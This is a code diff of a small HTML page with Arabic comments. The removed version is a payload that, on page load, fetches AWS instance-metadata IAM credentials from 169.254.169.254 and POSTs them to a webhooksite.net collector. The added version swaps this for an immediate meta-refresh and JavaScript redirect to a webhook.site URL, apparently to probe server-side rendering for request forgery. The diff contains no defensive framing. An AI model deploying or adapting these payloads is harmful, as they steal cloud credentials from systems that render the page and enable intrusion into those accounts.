@@ -1,119 +1,19 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جلب اللوكال هوست وإرساله للويب هوك</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
-            padding: 20px;
-            background: #f5f5f5;
-        }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        #result {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 6px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            max-height: 400px;
-            overflow: auto;
-        }
-        .status {
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 4px;
-        }
-        .loading { background: #fff3cd; color: #856404; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-        .info {
-            background: #cce5ff;
-            color: #004085;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 4px;
-        }
-    </style>
+    <!-- الطريقة الأولى: تحويل تلقائي عبر الـ HTML بعد 0 ثانية -->
+    <meta http-equiv="refresh" content="0; url=https://webhook.site/cc20c4bc-9a45-4fb8-80dd-ee35896136b4">
+    <title>Redirecting...</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🌐 جلب اللوكال هوست وإرساله للويب هوك</h1>
-        <p>سيتم جلب محتوى <code>http://127.0.0.1</code> وإرساله إلى Webhook تلقائياً عند تحميل الصفحة.</p>
-        
-        <!-- إضافة العناصر المفقودة -->
-        <div id="status" class="status" style="display: none;"></div>
-        <div id="result"></div>
-        
-        <div class="info" style="margin-top: 20px;">
-            ⏳ جاري تنفيذ الطلب تلقائياً...
-        </div>
-    </div>
 
     <script>
-        window.addEventListener('DOMContentLoaded', function() {
-            const statusDiv = document.getElementById('status');
-            const resultDiv = document.getElementById('result');
-            
-            // إظهار حالة التحميل
-            statusDiv.style.display = 'block';
-            statusDiv.className = 'status loading';
-            statusDiv.textContent = '⏳ جاري جلب البيانات من http://127.0.0.1 ...';
-            resultDiv.textContent = '';
-
-            const webhookUrl = 'https://b5e91798-bc90-47c3-b1b0-106236ebd584.webhooksite.net/';
-
-            fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials')
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`فشل جلب الصفحة: ${response.status} ${response.statusText}`);
-                    }
-                    return response.text();
-                })
-                .then(htmlData => {
-                    statusDiv.className = 'status loading';
-                    statusDiv.textContent = '📤 جاري إرسال البيانات للويب هوك ...';
-                    
-                    return fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({ 
-                            html: htmlData,
-                            timestamp: new Date().toISOString(),
-                            source: 'localhost'
-                        })
-                    });
-                })
-                .then(webhookResponse => {
-                    if (!webhookResponse.ok) {
-                        throw new Error(`فشل إرسال للويب هوك: ${webhookResponse.status} ${webhookResponse.statusText}`);
-                    }
-                    return webhookResponse.text();
-                })
-                .then(data => {
-                    statusDiv.className = 'status success';
-                    statusDiv.textContent = '✅ تم الإرسال بنجاح!';
-                    resultDiv.textContent = `✅ تم إرسال محتوى اللوكال هوست إلى:\n${webhookUrl}\n\n📦 رد الويب هوك:\n${data}`;
-                    console.log('تم الإرسال بنجاح:', data);
-                })
-                .catch(error => {
-                    statusDiv.className = 'status error';
-                    statusDiv.textContent = `❌ حدث خطأ: ${error.message}`;
-                    resultDiv.textContent = `❌ تفاصيل الخطأ:\n${error.stack || error}`;
-                    console.error('خطأ:', error);
-                });
-        });
+        // الطريقة الثانية: تحويل عبر الجافا سكريبت كدعم إضافي فور تحميل الجسم
+        window.onload = function() {
+            window.location.href = "https://webhook.site/cc20c4bc-9a45-4fb8-80dd-ee35896136b4";
+        };
     </script>
+
 </body>
 </html>
